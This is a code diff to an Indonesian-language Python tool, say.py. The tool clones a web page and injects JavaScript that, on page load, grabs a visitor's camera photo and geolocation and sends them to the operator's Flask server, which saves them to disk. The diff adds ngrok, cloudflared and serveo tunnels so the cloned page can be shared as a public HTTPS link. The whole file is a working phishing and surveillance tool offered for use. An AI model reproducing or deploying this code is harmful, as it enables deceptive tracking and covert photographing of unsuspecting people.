@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # lang: Python 3, file: say.py, target: Termux / Linux
 # jalankan: python say.py
-# dep: flask requests (pip install flask requests)
+# dep: flask requests pyngrok  (pip install flask requests pyngrok)
 
 import os
 import sys
@@ -9,6 +9,11 @@ import base64
 import datetime
 import threading
 import webbrowser
+import time
+import subprocess
+import shutil
+import socket
+import re
 
 try:
     from flask import Flask, request, jsonify, send_from_directory
@@ -21,6 +26,12 @@ try:
 except ImportError:
     req_lib = None
 
+try:
+    from pyngrok import ngrok as _ngrok
+    PYNGROK = True
+except ImportError:
+    PYNGROK = False
+
 # ------------------------------------------------------------------ #
 #  BANNER
 # ------------------------------------------------------------------ #
@@ -31,11 +42,11 @@ BANNER = r"""
   ___) | (_| | |_| || |___| | | |  __/  __/\__ \  __/
  |____/ \__,_|\__, | \____|_| |_|\___|\___||___/\___|
               |___/                                   
-  tools lokasi + foto — simpan lokal
+  tools lokasi + foto — lokal / ngrok / cloudflared / serveo
 """
 
 # ------------------------------------------------------------------ #
-#  JS INJECT — ambil lokasi + foto, kirim ke /capture
+#  JS INJECT
 # ------------------------------------------------------------------ #
 INJECT_JS = """
 <script>
@@ -56,7 +67,6 @@ INJECT_JS = """
     });
   }
 
-  // --- ambil lokasi ---
   function grabLocation(photoB64) {
     if (!navigator.geolocation) {
       sendData(null, null, null, photoB64);
@@ -76,7 +86,6 @@ INJECT_JS = """
     );
   }
 
-  // --- ambil foto via kamera ---
   function grabPhoto() {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
       grabLocation(null);
@@ -101,7 +110,6 @@ INJECT_JS = """
       .catch(function() { grabLocation(null); });
   }
 
-  // mulai setelah halaman load
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', grabPhoto);
   } else {
@@ -127,12 +135,20 @@ def clone_url(url: str) -> str:
 
 
 def inject_into_html(html: str) -> str:
-    """Sisipkan JS sebelum </body>, atau di akhir kalau tidak ada tag itu."""
     lower = html.lower()
     idx = lower.rfind("</body>")
     if idx != -1:
         return html[:idx] + INJECT_JS + html[idx:]
     return html + INJECT_JS
+
+
+def free_port(start: int = 8080) -> int:
+    port = start
+    while True:
+        with socket.socket() as s:
+            if s.connect_ex(("127.0.0.1", port)) != 0:
+                return port
+            port += 1
 
 
 # ------------------------------------------------------------------ #
@@ -147,7 +163,6 @@ def save_result(data: dict):
     acc  = data.get("accuracy")
     foto = data.get("photo")
 
-    # tulis koordinat
     loc_path = os.path.join("hasil", f"lokasi_{ts}.txt")
     with open(loc_path, "w") as f:
         if lat and lon:
@@ -159,7 +174,6 @@ def save_result(data: dict):
             f.write("Lokasi tidak berhasil didapat.\n")
     print(f"[+] Lokasi disimpan  → {loc_path}")
 
-    # tulis foto
     if foto:
         try:
             img_data = base64.b64decode(foto)
@@ -177,7 +191,7 @@ def save_result(data: dict):
 #  FLASK APP
 # ------------------------------------------------------------------ #
 app = Flask(__name__)
-_page_html = ""   # HTML yang sudah di-inject, diisi sebelum server jalan
+_page_html = ""
 
 
 @app.route("/")
@@ -192,10 +206,137 @@ def capture():
     return jsonify({"ok": True})
 
 
-# endpoint fallback untuk aset relatif (gambar, css, js) dari dir kerja
 @app.route("/<path:filename>")
 def static_files(filename):
     return send_from_directory(".", filename)
+
+
+def run_flask(port: int):
+    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
+
+
+# ------------------------------------------------------------------ #
+#  TUNNEL: NGROK
+# ------------------------------------------------------------------ #
+def tunnel_ngrok(port: int) -> str | None:
+    # cara 1: pyngrok
+    if PYNGROK:
+        token = input(
+            " Authtoken ngrok (Enter skip jika sudah login): "
+        ).strip()
+        try:
+            if token:
+                _ngrok.set_auth_token(token)
+            tunnel = _ngrok.connect(port, "http")
+            return tunnel.public_url.replace("http://", "https://")
+        except Exception as e:
+            print(f"[!] pyngrok error: {e}")
+
+    # cara 2: binary
+    if shutil.which("ngrok"):
+        token = input(
+            " Authtoken ngrok (Enter skip jika sudah login): "
+        ).strip()
+        if token:
+            subprocess.run(["ngrok", "config", "add-authtoken", token],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.Popen(
+            ["ngrok", "http", str(port)],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        print("[*] Menunggu tunnel ngrok...")
+        for _ in range(20):
+            time.sleep(0.6)
+            try:
+                r = req_lib.get("http://127.0.0.1:4040/api/tunnels", timeout=2)
+                for t in r.json().get("tunnels", []):
+                    u = t.get("public_url", "")
+                    if u.startswith("https"):
+                        return u
+                    if u.startswith("http"):
+                        return u
+            except Exception:
+                continue
+        print("[!] Ngrok timeout.")
+        return None
+
+    print("[!] ngrok / pyngrok tidak ditemukan.")
+    print("    Install: pip install pyngrok  atau  pkg install ngrok")
+    return None
+
+
+# ------------------------------------------------------------------ #
+#  TUNNEL: CLOUDFLARED  ★ recommended ★
+# ------------------------------------------------------------------ #
+def tunnel_cloudflared(port: int) -> str | None:
+    binary = shutil.which("cloudflared") or shutil.which("cloudflared.exe")
+    if not binary:
+        print("[!] cloudflared tidak ditemukan.")
+        print("    Termux : pkg install cloudflared")
+        print("    Linux  : wget -q https://github.com/cloudflare/cloudflared/releases/latest"
+              "/download/cloudflared-linux-amd64 -O cloudflared && chmod +x cloudflared && mv cloudflared /usr/local/bin/")
+        return None
+
+    proc = subprocess.Popen(
+        [binary, "tunnel", "--url", f"http://localhost:{port}"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True,
+        bufsize=1
+    )
+
+    print("[*] Menunggu tunnel cloudflared...")
+    url_pattern = re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")
+
+    for _ in range(40):
+        line = proc.stdout.readline()
+        if not line:
+            time.sleep(0.5)
+            continue
+        match = url_pattern.search(line)
+        if match:
+            return match.group(0)
+
+    print("[!] Cloudflared timeout — URL tidak kebaca.")
+    proc.terminate()
+    return None
+
+
+# ------------------------------------------------------------------ #
+#  TUNNEL: SERVEO (SSH)
+# ------------------------------------------------------------------ #
+def tunnel_serveo(port: int) -> str | None:
+    if not shutil.which("ssh"):
+        print("[!] SSH tidak ditemukan. Install: pkg install openssh")
+        return None
+
+    print("[*] Membuka tunnel serveo.net via SSH...")
+    proc = subprocess.Popen(
+        ["ssh", "-o", "StrictHostKeyChecking=no",
+         "-o", "ServerAliveInterval=30",
+         "-R", f"80:localhost:{port}",
+         "serveo.net"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True,
+        bufsize=1
+    )
+
+    url_pattern = re.compile(r"https?://[a-zA-Z0-9\-]+\.serveo\.net")
+    for _ in range(30):
+        line = proc.stdout.readline()
+        if not line:
+            time.sleep(0.5)
+            continue
+        print(f"   serveo: {line.strip()}")
+        match = url_pattern.search(line)
+        if match:
+            return match.group(0)
+
+    print("[!] Serveo timeout.")
+    proc.terminate()
+    return None
 
 
 # ------------------------------------------------------------------ #
@@ -205,14 +346,15 @@ def main():
     global _page_html
 
     print(BANNER)
-    print("=" * 55)
-    print(" Pilih mode template:")
+
+    # === STEP 1: pilih template ===
+    print("=" * 57)
     print("  [1] Clone dari URL")
     print("  [2] Pakai file HTML lokal")
-    print("=" * 55)
+    print("=" * 57)
 
     while True:
-        pilihan = input("\n Masukkan pilihan (1/2): ").strip()
+        pilihan = input("\n Pilihan template (1/2): ").strip()
         if pilihan in ("1", "2"):
             break
         print("[!] Masukkan 1 atau 2.")
@@ -220,7 +362,7 @@ def main():
     raw_html = ""
 
     if pilihan == "1":
-        url = input(" Masukkan URL template : ").strip()
+        url = input(" URL template : ").strip()
         if not url.startswith("http"):
             url = "https://" + url
         print(f"[*] Cloning {url} ...")
@@ -230,9 +372,8 @@ def main():
         except Exception as e:
             print(f"[!] Gagal clone: {e}")
             sys.exit(1)
-
     else:
-        path = input(" Masukkan path file HTML : ").strip().strip('"').strip("'")
+        path = input(" Path file HTML : ").strip().strip('"').strip("'")
         if not os.path.isfile(path):
             print(f"[!] File tidak ditemukan: {path}")
             sys.exit(1)
@@ -241,29 +382,70 @@ def main():
         print("[+] File berhasil dibaca.")
 
     _page_html = inject_into_html(raw_html)
-    print("[+] JS injeksi berhasil disisipin.")
+    print("[+] JS injeksi OK.")
 
-    port = 8080
-    # cari port kosong kalau 8080 bentrok
-    import socket
+    port = free_port(8080)
+
+    # === STEP 2: pilih server / tunnel ===
+    print("\n" + "=" * 57)
+    print("  Jalankan server di mana?")
+    print()
+    print("  [1] Lokal saja         (http://127.0.0.1)")
+    print("  [2] Ngrok              (butuh akun ngrok)")
+    print("  [3] Cloudflared        ★ RECOMMENDED — no akun, HTTPS otomatis")
+    print("  [4] Serveo             (via SSH, no install)")
+    print("=" * 57)
+
     while True:
-        with socket.socket() as s:
-            if s.connect_ex(("127.0.0.1", port)) != 0:
-                break
-            port += 1
+        mode = input("\n Pilihan server (1/2/3/4): ").strip()
+        if mode in ("1", "2", "3", "4"):
+            break
+        print("[!] Masukkan 1, 2, 3, atau 4.")
 
     local_url = f"http://127.0.0.1:{port}"
-    print(f"\n[+] Server jalan di  : {local_url}")
-    print(f"[+] Hasil tersimpan  : ./hasil/")
-    print(f"[*] Tekan Ctrl+C untuk berhenti.\n")
 
-    # buka browser otomatis (opsional, skip kalau gagal)
-    try:
-        threading.Timer(1.0, lambda: webbrowser.open(local_url)).start()
-    except Exception:
-        pass
+    if mode == "1":
+        # lokal aja
+        print(f"\n[+] Server lokal  : {local_url}")
+        print(f"[+] Hasil         : ./hasil/")
+        print(f"[*] Ctrl+C untuk berhenti.\n")
+        try:
+            threading.Timer(1.0, lambda: webbrowser.open(local_url)).start()
+        except Exception:
+            pass
+        app.run(host="0.0.0.0", port=port, debug=False)
 
-    app.run(host="0.0.0.0", port=port, debug=False)
+    else:
+        # spawn flask di background thread dulu
+        flask_thread = threading.Thread(target=run_flask, args=(port,), daemon=True)
+        flask_thread.start()
+        time.sleep(1.2)
+
+        pub_url = None
+
+        if mode == "2":
+            pub_url = tunnel_ngrok(port)
+        elif mode == "3":
+            pub_url = tunnel_cloudflared(port)
+        elif mode == "4":
+            pub_url = tunnel_serveo(port)
+
+        if pub_url:
+            print(f"\n{'=' * 57}")
+            print(f"  [+] LINK PUBLIK  : {pub_url}")
+            print(f"{'=' * 57}")
+            print(f"  [+] Lokal        : {local_url}")
+            print(f"  [+] Hasil        : ./hasil/")
+            print(f"  [*] Ctrl+C untuk berhenti.\n")
+        else:
+            print(f"\n[!] Tunnel gagal. Server tetap jalan lokal.")
+            print(f"[+] Lokal : {local_url}\n")
+
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("\n[*] Dihentikan.")
 
 
 if __name__ == "__main__":
